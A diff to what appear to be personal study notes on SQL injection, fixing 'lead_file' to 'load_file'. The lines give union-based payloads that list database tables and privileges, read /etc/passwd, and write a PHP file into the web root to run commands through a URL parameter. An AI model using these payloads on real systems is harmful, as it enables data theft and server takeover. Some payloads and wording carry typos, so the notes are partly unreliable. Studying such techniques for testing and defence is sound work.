@@ -21,7 +21,7 @@
 - The Information_schema table contains every database's information and the tables and columns inside it.
 - to access the information_schema we can type `' union select table_name,table_schema from information_schema.tables where table_schema='<database>'-- `. Here table_schema is the name of databases inside the server and '.' is analougus to '/' in linux.
 - to check the local privilages to load a file we use `' union select grantee,privilege_type, from information_schema.user_privileges-- `.
-- if we have the privilages we can use commands like `'union select lead_file("/etc/passwd")-- ` which will open the /etc/passwd directory in the website.
+- if we have the privilages we can use commands like `'union select load_file("/etc/passwd")-- ` which will open the /etc/passwd directory in the website.
 - We can also write a file using outfile command `' union select 'writing in file' into outfile '/var/www/html/index.php'-- ` and then run it using URL where it shows something like this->
 index.php?0=type_here_to_get_output_ex:pwd.
 
